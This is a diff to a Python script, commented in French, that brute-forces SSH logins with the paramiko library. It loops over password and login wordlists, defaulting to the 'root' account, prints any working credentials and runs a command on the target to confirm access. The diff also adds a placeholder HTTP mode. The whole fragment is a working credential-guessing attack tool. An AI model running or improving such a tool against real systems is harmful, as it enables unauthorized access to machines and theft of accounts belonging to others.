@@ -13,7 +13,7 @@ import sys
 import paramiko
 
 
-ssh = paramiko.SSHClient
+ssh_client = paramiko.SSHClient()
 count_ligne_pass= 0
 count_ligne_login= 0
 
@@ -34,8 +34,7 @@ elif Nb_Arg <= 2 :
 #fonction qui prends verifie les arguement
 if sys.argv[1] == "ssh": #fonction faire des requet ssh avec la ligne du dico
     proto="ssh"
-    def requet_ssh(password, login):
-        ssh_client = paramiko.SSHClient()
+    def requet_ssh(password, login):        
         # A voir ce que fait la ligne avant
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
@@ -48,6 +47,10 @@ if sys.argv[1] == "ssh": #fonction faire des requet ssh avec la ligne du dico
             print ("Connection reussi sur la machine", url, "avec les credentials", login, ":", password)
             ssh_client.exec_command('touch ssh')# pour validé que la commande marche
             quit()
+elif sys.argv[1] == "http":
+    print ("Le brutforce sur le http n'est pas encore operationelle")
+    quit()
+
 
 else : 
     print("Il n'y a pas de protocole valable, séléctionner http ou ssh")
@@ -66,6 +69,12 @@ else :
 if Nb_Arg >= 3 :
     passdico = open(sys.argv[3]).read().splitlines()
 
+# Verifie si y a un dico de password
+if Nb_Arg <= 2: 
+    print ("Il n'y a pas de dictionnaire de password,  il faut en mettre un !!")
+
+
+# Si y a pas de diconnaire de login
 if Nb_Arg == 3 :
 
     for password in passdico :
@@ -74,15 +83,14 @@ if Nb_Arg == 3 :
             requet_ssh(password,"root") # appel de fonction request ssh
 
 
-elif Nb_Arg <= 2: 
-    print ("Il n'y a pas de dictionnaire de password,  il faut en mettre un !!")
 
 
 
 
+# Si il y a un dictionnaire de login
 if Nb_Arg >= 4 :
     
-    # Si il y a un dictionnaire de login
+
     logdico = open(sys.argv[4]).read().splitlines()
     for login in logdico :
         for password in passdico :            
